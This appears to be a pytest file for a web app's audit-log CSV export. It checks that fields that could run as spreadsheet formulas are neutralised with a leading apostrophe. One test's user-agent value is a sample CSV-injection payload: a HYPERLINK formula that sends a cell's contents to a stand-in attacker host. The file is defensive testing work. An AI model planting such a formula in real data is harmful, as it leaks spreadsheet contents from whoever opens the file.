"""稽核日誌 CSV 匯出不能讓試算表把使用者可控欄位當公式執行。"""

import csv
import io
import uuid
from datetime import UTC, datetime
from types import SimpleNamespace

import pytest

from app.models import AuditAction
from app.services.user import audit_service


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("=1+1", "'=1+1"),
        ("+cmd", "'+cmd"),
        ("-2+3", "'-2+3"),
        ("@SUM(A1)", "'@SUM(A1)"),
        ("\t=1", "'\t=1"),
        ("\r=1", "'\r=1"),
        ("  =HYPERLINK(1)", "'  =HYPERLINK(1)"),
        ("＝1+1", "'＝1+1"),
        ("Mozilla/5.0", "Mozilla/5.0"),
        ("王小明", "王小明"),
        ("a=b", "a=b"),
        ("", ""),
        (None, ""),
    ],
)
def test_csv_safe(raw: str | None, expected: str) -> None:
    assert audit_service._csv_safe(raw) == expected


def test_export_neutralises_attacker_controlled_cells(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    log = SimpleNamespace(
        id=uuid.uuid4(),
        created_at=datetime(2026, 9, 27, tzinfo=UTC),
        action=AuditAction.login_failed,
        user=SimpleNamespace(email="student@example.com", full_name="+cmd"),
        vmid=None,
        ip_address="10.0.0.1",
        user_agent='=HYPERLINK("https://evil.example/?d="&B2,"open")',
        details="@SUM(A1)",
    )
    monkeypatch.setattr(
        audit_service.audit_repo,
        "stream_audit_logs_for_export",
        lambda **_kwargs: iter([log]),
    )

    text = "".join(audit_service.export_csv_chunks(session=None))  # type: ignore[arg-type]
    header, row = list(csv.reader(io.StringIO(text)))

    cells = dict(zip(header, row, strict=True))
    assert cells["user_full_name"] == "'+cmd"
    assert cells["user_agent"].startswith("'=HYPERLINK")
    assert cells["details"] == "'@SUM(A1)"
    assert cells["user_email"] == "student@example.com"
    assert cells["ip_address"] == "10.0.0.1"
